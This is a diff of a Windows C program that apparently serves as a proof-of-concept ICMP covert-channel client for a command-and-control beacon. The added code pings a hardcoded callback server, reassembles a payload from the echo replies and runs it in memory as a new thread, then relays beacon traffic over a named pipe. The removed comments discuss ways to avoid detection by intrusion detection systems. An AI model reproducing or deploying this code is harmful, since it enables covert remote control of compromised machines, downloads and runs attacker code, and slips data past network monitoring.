@@ -1,153 +1,53 @@
-﻿/*
-POC: ICMP Send/Receive
-
-Pros;
-  - Quiet
-
-
-Cons:
-
-  - No protocol built in safeguards.
-    - session tracking
-
-
-Maybe Problems:
-
- - Type 8 sends the alphabet on basic ping checks. This might get flagged if not this value
-
- - [ ] OS likes to respond to icmp echo replies.
-        Fix:
-            option 1: Disable echo replies on linux:
-                `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1`
-            option 2: IP Tables filter out anything not containing TAG:
-                 `sudo iptables -A INPUT -p icmp --icmp-type echo-request -m string --algo bm --string "HCKD" -j DROP`
-                 - only works with unencrypted payloads due to tag in payload
-
-
-
-Fixes:
-
- - Checkout waht some toosl that implemented ICMP did:
-    PingTunnel?
-    Loki?
-
-
-
-Standard ICMP Flow for reference:
-[ Your System  ]                  [ Remote Host (e.g. 8.8.8.8) ]
-          |                                         |
-          | ------ ICMP Echo Request  ------------> |
-          |                                         |
-          | <----- ICMP Echo Reply  --------------- |
-          |                                         |
-
-
-
-Idea flow for implementation
-     [ (Agent) ]                              [ C2 Server ]
-          |                                         |
-     ---->| ------ ICMP Echo Request  ------------> | (ex, checkin, or send data back)--|
-Do things |                                         |                                   | Server Stuff
-     ^----| <----- ICMP Echo Reply  --------------- | (ex, command coming back) <--------
-          |                                         |
-
-//NOTE: ryan... go review ICMP standards/structure and amke sure you know all of this
-
-
-ICMP Packet Header (bytes)
-| Type (1) | Code (1) | Checksum (2) | Identifier (2) | Sequence Number (2) | Payload (variable, up to 32 bytes on win) |
-|----------|----------|--------------|----------------|---------------------|-------------------------------------------|
-
-or in a struct:
-
-struct icmp_header {
-    uint8_t Type;          // 8 for Echo Request
-    uint8_t Code;          // 0
-    uint16_t Checksum;     // Checksum of entire ICMP message
-    uint16_t ID;           // Identifier to match requests/replies
-    uint16_t Sequence;     // Sequence number for tracking requests
-};
-
-Protocol Breakdown:
-    IMCP Header=8 bytes (64 bits)
-    IP Headers=20
-    Payload=
-        MTU 1500: 1472 bytes per payload
-        Max IPV4 size= 65507-28 = 65,479, but this is known as the ping of death & may flag
-        "unix normal": 56 byte default payload field (+8 for header contents = 64 + 20 ipv4 = 84)
-        "windows normal": 32 byte default payload field (+8 for header contents + 20 for ipv4 headers = 60)
-
-
-
-Modifications of ICMP protocol for this application:
-
-struct icmp_header {
-    uint8_t Type;          // 8 for Echo Request
-    uint8_t Code;          // 0
-    uint16_t Checksum;     // Checksum of entire ICMP message
-    uint16_t ID;           // Identifier to match requests/replies - lets use PID.
-    uint16_t Sequence;     // Sequence number for tracking requests. Starts at 0, inline with windows ping behavior
-};
-
-Client sends initial message with length of inbound message. Sequence = 0. Seq 0 is ALWAYS the message size.
-
-Payload should have the first 4 bytes be a tag. Default is "RQ47", on first 2 bytes. DO NOT use anything in alphabetical order (ex ABCD)... that's what normal
-pings send, and will likely confuse the server.
-
-Server should allocate a buffer of this size.
-
-Server then monitors for packet with Seq 1, matching ID, and first 4 bytes being the TAG (ex, RQ47)
-Server appends the data section to the buffer.
-Server then Sends response back to ICMP request.
-
-Client gets response data, this response MUST contain the tag, otherwise the response is discarded. This is so an OS reply doesn't slip past by accident, etc.
-
-When client has sent all data OR a finish flag is received (CANNOT use seq or PID here), server stops listenening, and
-passes data to Team Server
-
-
-
-
-*/
-
-
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
+﻿#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment(lib, "ws2_32.lib")
 
+/*
+POC: ICMP Send/Receive (Fixed)
+
+This version ensures the client:
+  1. Sends a “seq 0” Echo Request (Type 8) containing:
+       [“RQ47”][4-byte big-endian total‐size]
+  2. Blocks in recv_icmp_fragments(), which only processes:
+       • Type = ICMP_ECHOREPLY (0)
+       • ID = GetCurrentProcessId()
+       • Payload starting with “RQ47”
+     and reassembles chunks of size (ICMP_PAYLOAD_SIZE – TAG_SIZE) = 496 bytes.
+
+To compile on Windows: link with ws2_32.lib
+*/
+#include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <winsock2.h>
 #include <windows.h>
 
-#define ICMP_ECHO 8
-#define ICMP_ECHOREPLY 0
-//size of payload/data section of icmp.
-//ideally, the program will do the math & figure out how to chunk messages based on this size. Currently, it does not
-#define ICMP_PAYLOAD_SIZE 500 //in bytes 
-//payload sizes: 32 = windows, 52 = linux, anything else is okay, but will be more suspicious to IDS's. Max is 1472. due to MTU. Otherwise you risk the packets fragmenting
-// which could cause some issues too. 
-#define IPV4_HEADER 20
-#define ICMP_HEADER 8
-#define ICMP_PACKET_SIZE (ICMP_HEADER + ICMP_PAYLOAD_SIZE) //icmp packet WITHOUT overhead of ipv4
+#define ICMP_ECHO       8
+#define ICMP_ECHOREPLY  0
+
+// size of payload/data section of ICMP (excluding the 8-byte ICMP header)
+#define ICMP_PAYLOAD_SIZE 500  // in bytes
+
+#define IPV4_HEADER    20
+#define ICMP_HEADER    8
+#define TAG_SIZE       4
 #define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
+
 #define ICMP_CALLBACK_SERVER "172.19.241.197"
-#define ICMP_TAG "RQ47"
-#define ICMP_TAG_SIZE 4
+#define ICMP_TAG             "RQ47"
 
-//cs options
-#define PAYLOAD_MAX_SIZE 512 * 1024
-#define BUFFER_MAX_SIZE 1024 * 1024
-
+#define PAYLOAD_MAX_SIZE  (512 * 1024)
+#define BUFFER_MAX_SIZE   (1024 * 1024)
 
 struct icmp_header {
-    BYTE Type;
-    BYTE Code;
+    BYTE  Type;
+    BYTE  Code;
     USHORT Checksum;
     USHORT ID;
     USHORT Sequence;
 };
 
-
-// Checksum function
+// Compute Internet checksum over `size` bytes (in network‐order) at `buffer`
 USHORT checksum(USHORT* buffer, int size) {
     unsigned long cksum = 0;
     while (size > 1) {
@@ -162,259 +62,277 @@ USHORT checksum(USHORT* buffer, int size) {
     return (USHORT)(~cksum);
 }
 
-/* read a frame from a handle */
+char* reassembly_buffer = NULL;
+int expected_size = 0;
+int received_chunks = 0;
+int total_chunks = 0;
+int received_map[1000]; // track received fragments (max 1000)
+
+// Forward declarations
+int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
+char* recv_icmp_fragments(SOCKET s);
+char* recv_icmp(SOCKET s);
+
+// Reads a “frame” from the given HANDLE by first reading a 4‐byte length, then that many bytes.
 DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
     DWORD size = 0, temp = 0, total = 0;
 
-    /* read the 4-byte length */
-    ReadFile(my_handle, (char*)&size, 4, &temp, NULL);
+    // Read the 4‐byte length prefix
+    if (!ReadFile(my_handle, (char*)&size, 4, &temp, NULL) || temp != 4) {
+        return 0; // error or no data
+    }
 
-    /* read the whole thing in */
+    // Ensure we don’t overflow the provided buffer
+    if (size > max) {
+        return 0;
+    }
+
+    // Read exactly `size` bytes into buffer
     while (total < size) {
-        ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
+        if (!ReadFile(my_handle, buffer + total, size - total, &temp, NULL)) {
+            return 0;
+        }
         total += temp;
     }
 
     return size;
 }
-
-/* write a frame to a file */
+// Writes a “frame” to the given HANDLE by first writing a 4‐byte length, then the data.
 void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
     DWORD wrote = 0;
+
+    // Write the 4‐byte length prefix
     WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
+
+    // Then write the actual `length` bytes
     WriteFile(my_handle, buffer, length, &wrote, NULL);
 }
 
-int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload) {
+
+
+//
+// send_icmp: send a single ICMP Echo Request (Type=8) with a custom sequence.
+// Arguments:
+//   s            = a raw socket (AF_INET, SOCK_RAW, IPPROTO_ICMP)
+//   dest         = pointer to destination sockaddr_in
+//   payload      = pointer to a buffer that already begins with TAG (4 bytes) followed by data
+//   payload_len  = total length of `payload` (must be ≤ ICMP_PAYLOAD_SIZE)
+//   seq_num      = sequence number to include (0 for “size” packet, 1..N for data chunks)
+//
+int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num) {
     char packet[MAX_PACKET_SIZE] = { 0 };
-
     struct icmp_header* icmp = (struct icmp_header*)packet;
-    icmp->Type = ICMP_ECHO;
+
+    icmp->Type = ICMP_ECHO;                           // 8 = Echo Request
     icmp->Code = 0;
-    //icmp->ID = (USHORT)GetCurrentProcessId();
-    //icmp->Sequence = 1;
     icmp->ID = htons((USHORT)GetCurrentProcessId());
-    icmp->Sequence = htons(1);
+    icmp->Sequence = htons(seq_num);
 
-
-    char* data = packet + sizeof(struct icmp_header);
-
-    const char* tag = ICMP_TAG; // 4-byte tag
-
-    // Ensure we don't overflow ICMP_PAYLOAD_SIZE
-    // Final payload size = strlen(tag) + strlen(payload)
-    if (strlen(tag) + strlen(payload) >= ICMP_PAYLOAD_SIZE) {
-        printf("[-] Payload too large. Max allowed: %d bytes\n", ICMP_PAYLOAD_SIZE - (int)strlen(tag) - 1);
-        return -1;
-    }
-
-    snprintf(data, ICMP_PAYLOAD_SIZE, "%s%s", tag, payload);
+    // Copy `payload_len` bytes of (TAG + data) right after the 8-byte ICMP header
+    memcpy(packet + sizeof(struct icmp_header), payload, payload_len);
 
     icmp->Checksum = 0;
     icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));
-
-    printf("[+] Sending ICMP Echo Request...\n");
 
     int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
     if (result == SOCKET_ERROR) {
         printf("[-] sendto failed: %d\n", WSAGetLastError());
         return -1;
     }
-
-    printf("[+] Packet sent. Dump:\n");
-    printf("    Type: %d\n", icmp->Type);
-    printf("    Code: %d\n", icmp->Code);
-    printf("    ID: %d\n", ntohs(icmp->ID));
-    printf("    Seq: %d\n", ntohs(icmp->Sequence));
-    printf("    Payload: %s\n", data);
-
+    printf("[+] Sent ICMP Echo Request: seq=%d, payload_len=%d\n", seq_num, payload_len);
     return 0;
 }
 
-#define TAG_SIZE 4
-#define MAX_CHUNKS 1000 // adjust max fragments expected
-
-char* reassembly_buffer = NULL;
-int expected_size = 0;
-int received_chunks = 0;
-int total_chunks = 0;
-
-int received_map[MAX_CHUNKS]; // track received fragments (0/1)
-
+//
+// recv_icmp_fragments: block until all chunks (including seq 0) arrive as Echo Replies.
+// Only processes packets satisfying:
+//   - ICMP.Type    == ICMP_ECHOREPLY (0)
+//   - ICMP.Code    == 0
+//   - ICMP.ID      == GetCurrentProcessId()
+//   - payload starts with “RQ47”
+// Reassembles chunks of data (each chunk carries up to ICMP_PAYLOAD_SIZE−TAG_SIZE bytes).
+//
 char* recv_icmp_fragments(SOCKET s) {
-    /*
-    BROKEN
-    
-    */
-    printf("BROKEN: CHUNKS DO NOT FINISH, MEANING IT HANGS ON THE recv_icmp_fragments FUCNTION. Likely sometihgnoff with chunk math??\n");
     char recvbuf[MAX_PACKET_SIZE];
-    SOCKADDR_IN from;
+    struct sockaddr_in from;
     int fromlen = sizeof(from);
+
+    printf("[*] Waiting to receive seq 0 and subsequent chunks...\n");
 
     while (TRUE) {
         int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
         if (bytes == SOCKET_ERROR) {
-            printf("[-] recvfrom failed: %d\n", WSAGetLastError());
+            int err = WSAGetLastError();
+            if (err == WSAETIMEDOUT) {
+                printf("[-] recvfrom timed out\n");
+            }
+            else {
+                printf("[-] recvfrom failed: %d\n", err);
+            }
             return NULL;
         }
 
+        // Must be at least: IP header (20) + ICMP header (8) + TAG (4)
         if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
-            printf("[-] Packet too small\n");
             continue;
         }
 
         struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
         char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);
 
+        // ─── Discard anything that is not an Echo Reply ───
+        if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
+            continue;
+        }
+
+        // ─── Discard replies not matching our process ID ───
+        USHORT resp_id = ntohs(icmp->ID);
+        if (resp_id != (USHORT)GetCurrentProcessId()) {
+            continue;
+        }
+
+        // ─── Discard if payload does not begin with TAG ───
         if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
-            printf("[-] Packet missing tag\n");
             continue;
         }
 
         USHORT seq = ntohs(icmp->Sequence);
-        printf("[+] Received fragment seq=%d\n", seq);
+        printf("[+] Received Echo Reply: seq=%d, total_bytes=%d\n", seq, bytes);
 
-        // Handle seq 0 - total size
+        // Handle seq 0 — “size” packet
         if (seq == 0) {
-            // Next 4 bytes after tag is total payload size
-            int size = 0;
-            memcpy(&size, payload + TAG_SIZE, 4);
-            expected_size = ntohl(size);
-            printf("[+] Total payload size: %d\n", expected_size);
+            // Next 4 bytes after TAG is total payload size (big-endian)
+            uint32_t netlen = 0;
+            memcpy(&netlen, payload + TAG_SIZE, sizeof(netlen));
+            expected_size = ntohl(netlen);
+            printf("[+] Seq 0: expected_size = %d bytes\n", expected_size);
 
-            // Allocate buffer to hold entire payload
-            if (reassembly_buffer) free(reassembly_buffer);
+            // Allocate buffer for the entire incoming payload
+            if (reassembly_buffer) {
+                free(reassembly_buffer);
+                reassembly_buffer = NULL;
+            }
             reassembly_buffer = (char*)malloc(expected_size);
             if (!reassembly_buffer) {
                 perror("malloc");
                 return NULL;
             }
 
+            // Initialize map/counters
             memset(received_map, 0, sizeof(received_map));
             received_chunks = 0;
-            //total_chunks = (expected_size + ICMP_PAYLOAD_SIZE - 1) / ICMP_PAYLOAD_SIZE;
-            // Instead of dividing by ICMP_PAYLOAD_SIZE, divide by “data per chunk = ICMP_PAYLOAD_SIZE – TAG_SIZE”.
-            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
+            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE; // 500 − 4 = 496
             total_chunks = (expected_size + data_per_chunk - 1) / data_per_chunk;
-
-
-            continue; // wait for next packets
+            printf("[+] Total chunks to receive: %d (data_per_chunk=%d)\n",
+                total_chunks, data_per_chunk);
+            continue;
         }
 
+        // Handle seq > 0 — actual data fragments
         if (seq > 0 && seq <= total_chunks) {
             int chunk_index = seq - 1;
-            if (received_map[chunk_index] == 1) {
-                printf("[*] Duplicate fragment seq=%d\n", seq);
-                continue; // skip duplicates
+            if (received_map[chunk_index]) {
+                printf("[*] Duplicate fragment seq=%d, skipping\n", seq);
+                continue;
             }
 
-            //int chunk_offset = chunk_index * ICMP_PAYLOAD_SIZE;
+            // Compute how many data bytes arrived (after IP+ICMP+TAG)
+            int overhead = IPV4_HEADER + sizeof(struct icmp_header) + TAG_SIZE;
+            int data_bytes = bytes - overhead;
+            if (data_bytes < 0) data_bytes = 0;
+
+            // Print chunk contents for debugging
+            printf("[+] Chunk %d: data_bytes=%d\n", seq, data_bytes);
+            printf("    As text: \"%.*s\"\n", data_bytes, payload + TAG_SIZE);
+            printf("    Hex dump: ");
+            for (int i = 0; i < data_bytes; i++) {
+                printf("%02x ", (unsigned char)(payload[TAG_SIZE + i]));
+            }
+            printf("\n");
+
+            // Copy into reassembly_buffer at correct offset
             int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
             int chunk_offset = chunk_index * data_per_chunk;
-
-            int chunk_size = bytes - IPV4_HEADER - sizeof(struct icmp_header) - TAG_SIZE;
-            if (chunk_offset + chunk_size > expected_size) {
-                chunk_size = expected_size - chunk_offset; // trim last chunk
+            int copy_bytes = data_bytes;
+            if (chunk_offset + copy_bytes > expected_size) {
+                copy_bytes = expected_size - chunk_offset;
             }
+            memcpy(reassembly_buffer + chunk_offset, payload + TAG_SIZE, copy_bytes);
 
-            memcpy(reassembly_buffer + chunk_offset, payload + TAG_SIZE, chunk_size);
             received_map[chunk_index] = 1;
             received_chunks++;
-
             printf("[+] Stored chunk %d/%d\n", received_chunks, total_chunks);
 
             if (received_chunks == total_chunks) {
                 printf("[+] All fragments received!\n");
-                return reassembly_buffer; // full payload ready
+                return reassembly_buffer;
             }
         }
     }
 
+    // Should not reach here
     return NULL;
 }
 
-
+//
+// recv_icmp: simple wrapper to receive a single Echo Reply (Type 0) carrying a small payload.
+// Returns a malloc’d buffer (null‐terminated) of payload bytes after the TAG.
+//
 char* recv_icmp(SOCKET s) {
-    char recvbuf[ICMP_PACKET_SIZE];
-    SOCKADDR_IN from;
+    char recvbuf[MAX_PACKET_SIZE];
+    struct sockaddr_in from;
     int fromlen = sizeof(from);
 
-    printf("[+] Waiting for ICMP Echo Reply...\n");
-
+    printf("[*] Waiting for single ICMP Echo Reply...\n");
     int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
     if (bytes == SOCKET_ERROR) {
         printf("[-] recvfrom failed: %d\n", WSAGetLastError());
         return NULL;
     }
 
-    printf("[+] Received %d bytes from %s\n", bytes, inet_ntoa(from.sin_addr));
-
-    if (bytes < 28) {
-        printf("[-] Packet too small to contain valid ICMP payload\n");
+    if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
         return NULL;
     }
 
-    struct icmp_header* icmp = (struct icmp_header*)(recvbuf + 20);
-    char* payload = (char*)(recvbuf + 20 + sizeof(struct icmp_header));
+    struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
+    char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);
 
-    // Validate tag
-    if (strncmp(payload, ICMP_TAG, 4) != 0) {
-        printf("[-] Invalid or untagged ICMP payload\n");
+    // Must be an Echo Reply (Type 0) for our PID
+    if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
+        return NULL;
+    }
+    if (ntohs(icmp->ID) != (USHORT)GetCurrentProcessId()) {
+        return NULL;
+    }
+    // Must begin with TAG
+    if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
         return NULL;
     }
 
-    printf("    Type: %d\n", icmp->Type);
-    printf("    Code: %d\n", icmp->Code);
-    printf("    ID: %d\n", ntohs(icmp->ID));
-    printf("    Seq: %d\n", ntohs(icmp->Sequence));
-
-    // Calculate tagless payload size
-    int payload_len = bytes - 20 - sizeof(struct icmp_header) - 4; // minus IP + ICMP header + tag
+    // Copy whatever bytes follow the tag
+    int payload_len = bytes - IPV4_HEADER - sizeof(struct icmp_header) - TAG_SIZE;
     if (payload_len <= 0) {
-        printf("[-] No actual data after tag.\n");
         return NULL;
     }
-
-    // Allocate buffer and copy payload
     char* out_data = (char*)malloc(payload_len + 1);
     if (!out_data) {
         perror("malloc");
         return NULL;
     }
-
-    memcpy(out_data, payload + 4, payload_len);
-    out_data[payload_len] = '\0'; // Null-terminate for safety
-
-    printf("    Payload (tagless): %s\n", out_data);
+    memcpy(out_data, payload + TAG_SIZE, payload_len);
+    out_data[payload_len] = '\0';
     return out_data;
 }
 
-
-void debug() {
-    printf("ICMP_ECHO: %d\n", ICMP_ECHO);
-    printf("ICMP_ECHOREPLY: %d\n", ICMP_ECHOREPLY);
-    printf("ICMP_PAYLOAD_SIZE: %d\n", ICMP_PAYLOAD_SIZE);
-    printf("IPV4_HEADER: %d\n", IPV4_HEADER);
-    printf("ICMP_HEADER: %d\n", ICMP_HEADER);
-    printf("ICMP_PACKET_SIZE: %d\n", ICMP_PACKET_SIZE);
-    printf("MAX_PACKET_SIZE: %d\n", MAX_PACKET_SIZE);
-    printf("ICMP_CALLBACK_SERVER: %s\n", ICMP_CALLBACK_SERVER);
-    printf("ICMP_TAG: %s\n", ICMP_TAG);
-}
-
-
-void print_hex_contents(const char* buffer, size_t length) {
-    for (size_t i = 0; i < length; i++) {
-        printf("%02x ", (unsigned char)buffer[i]);
-        if ((i + 1) % 16 == 0)
-            printf("\n"); // newline every 16 bytes for readability
-    }
-    printf("\n");
-}
-
+//
+// bridge_to_beacon: high-level flow
+//   1) Create raw ICMP socket
+//   2) Build “seq 0” size packet: [TAG (4 bytes)] + [4-byte big-endian total-size]
+//   3) send_icmp(..., seq=0)
+//   4) call recv_icmp_fragments(), which returns the complete payload
+//   5) Inject payload (as a new thread) and then relay any further traffic via named pipe
+//
 int bridge_to_beacon() {
-
-    //Setup stuff
     printf("[+] Creating raw socket...\n");
     SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (s == INVALID_SOCKET) {
@@ -422,120 +340,130 @@ int bridge_to_beacon() {
         return 1;
     }
 
+    // Optional: set recv timeout so we don’t block forever
+    int timeout_ms = 5000; // 5 seconds
+    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
 
     struct sockaddr_in dest;
     dest.sin_family = AF_INET;
-    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);  // Replace with your C2 server IP
+    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
 
-    //options to controller, which will get relayed to Server
-    //send_icmp(s, &dest, "arch=x86");
-    //send_icmp(s, &dest, "pipename=foobar");
-    //send_icmp(s, &dest, "block=100");
-    // NOPE - this is done controller side for simplicity rn
+    // 1) Build “seq=0” size packet
+    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
+    uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
+    uint32_t netlen = htonl(expected_server_payload);
 
-    //request payload from controller, which will get it from server
-    char* payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // sus ram desc
-    //send first checkin
-    printf("PLACEHOLDER PAYLOAD SIZE\n");
-    DWORD payload_size = 241540;
-    if (send_icmp(s, &dest, "OI GIMME A PAYLOAD") == 0) {
-        //and the server should return us the payload
-        char* payload = recv_icmp_fragments(s);
+    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+    // Copy “RQ47”
+    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
+    // Then 4-byte big-endian length
+    memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
+    // Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
+    int size_payload_len = TAG_SIZE + sizeof(netlen);
 
+    // Send seq=0 Echo Request
+    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
+        printf("[-] Failed to send seq=0 packet\n");
+        closesocket(s);
+        return 1;
     }
-    printf("PAYLOAD: %s", payload);
 
-    /* inject the payload stage into the current process */
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);
+    // 2) Wait for and reassemble all fragments (Echo Replies)
+    char* full_payload = recv_icmp_fragments(s);
+    if (!full_payload) {
+        printf("[-] Failed to receive full payload\n");
+        closesocket(s);
+        return 1;
+    }
 
-    //bridge to beacon's pipe
+    printf("[+] Received full payload: first 64 bytes as string:\n    %.64s\n", full_payload);
+
+    // 3) Inject the payload into memory and start executing it
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)full_payload, NULL, 0, NULL);
+
+    // 4) Bridge to beacon’s named pipe (\\.\pipe\foobar)
     HANDLE handle_beacon = INVALID_HANDLE_VALUE;
     while (handle_beacon == INVALID_HANDLE_VALUE) {
         Sleep(1000);
-        handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
-            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
+        handle_beacon = CreateFileA(
+            "\\\\.\\pipe\\foobar",
+            GENERIC_READ | GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
+            NULL
+        );
     }
 
+    char* pipe_buffer = (char*)malloc(BUFFER_MAX_SIZE);
+    if (!pipe_buffer) {
+        perror("malloc");
+        closesocket(s);
+        CloseHandle(handle_beacon);
+        return 1;
+    }
 
-
-    //while true... send icmp on data
-
-    //soemthig something on pipe, realy datya back
-    //if (send_icmp(s, &dest) == 0) {
-    //    response = recv_icmp(s);
-    //}
-    //response send to pipe...
-
-
-        /* setup our buffer */
-    char* buffer = (char*)malloc(BUFFER_MAX_SIZE); /* 1MB should do */
-
-    /*
-     * relay frames back and forth
-     */
-    printf("[+] Starting comms with beacon");
     while (TRUE) {
-        char* data_for_beacon = NULL; // recv_icmp will fill this
-
-        /* read from our named pipe Beacon */
-        DWORD beacon_output = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
-        //DWORD beacon_output = "SomeOutput";
-        //if beacon has nothing to send... this might break.
-        if (beacon_output < 0) {
+        // Read from beacon’s pipe
+        DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
+        if (beacon_output == 0 || beacon_output == (DWORD)-1) {
             break;
         }
 
-        /* write to the External C2 server */
-        //send_frame(socket_extc2, buffer, read);
+        // Construct chunk payload: TAG + data
+        int data_len = (int)beacon_output;
+        if (data_len > ICMP_PAYLOAD_SIZE - TAG_SIZE) {
+            data_len = ICMP_PAYLOAD_SIZE - TAG_SIZE;
+        }
+        char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+        memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
+        memcpy(chunk_buf + TAG_SIZE, pipe_buffer, data_len);
+        int chunk_payload_len = TAG_SIZE + data_len;
 
-        //send back beacon output
-        if (send_icmp(s, &dest, beacon_output) == 0) {
-            //and get next command if any
-            data_for_beacon = recv_icmp(s);
+        // Send as an Echo Request with seq=1
+        send_icmp(s, &dest, chunk_buf, chunk_payload_len, 1);
+
+        // Wait for controller’s response (type 0)
+        char* controller_resp = recv_icmp(s);
+        if (controller_resp) {
+            write_frame(handle_beacon, controller_resp, (DWORD)strlen(controller_resp));
+            free(controller_resp);
         }
 
-
-        /* write to our named pipe Beacon */
-        write_frame(handle_beacon, buffer, data_for_beacon);
-        //printf("Fake Write Frame...");
         Sleep(1000);
-
-        /* read from the External C2 server */
-        //read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
-        //if (read < 0) {
-        //    break;
-        //}
-
-
     }
 
-    /* close our handles */
+    // Cleanup
+    free(pipe_buffer);
     CloseHandle(handle_beacon);
-
-
-    //cleanup
     closesocket(s);
-    WSACleanup();
+    return 0;
 }
 
-
-
+void debug_constants() {
+    printf("ICMP_ECHO: %d\n", ICMP_ECHO);
+    printf("ICMP_ECHOREPLY: %d\n", ICMP_ECHOREPLY);
+    printf("ICMP_PAYLOAD_SIZE: %d\n", ICMP_PAYLOAD_SIZE);
+    printf("IPV4_HEADER: %d\n", IPV4_HEADER);
+    printf("ICMP_HEADER: %d\n", ICMP_HEADER);
+    printf("TAG_SIZE: %d\n", TAG_SIZE);
+    printf("MAX_PACKET_SIZE: %d\n", MAX_PACKET_SIZE);
+    printf("ICMP_CALLBACK_SERVER: %s\n", ICMP_CALLBACK_SERVER);
+    printf("ICMP_TAG: %s\n", ICMP_TAG);
+}
 
 int main() {
-    printf("[+] ICMP WIN\n");
-    const char* SERVER_IP = ICMP_CALLBACK_SERVER;
-    printf("[+] SERVER: %s\n", SERVER_IP);
-
-    debug();
+    printf("[+] ICMP C2 Client Starting...\n");
+    debug_constants();
 
     WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        printf("[-] WSAStartup failed\n");
+        return 1;
+    }
 
-    bridge_to_beacon();
-    //if (send_icmp(s, &dest) == 0) {
-    //    recv_icmp(s);
-    //}
-
-
-    return 0;
+    int result = bridge_to_beacon();
+    WSACleanup();
+    return result;
 }
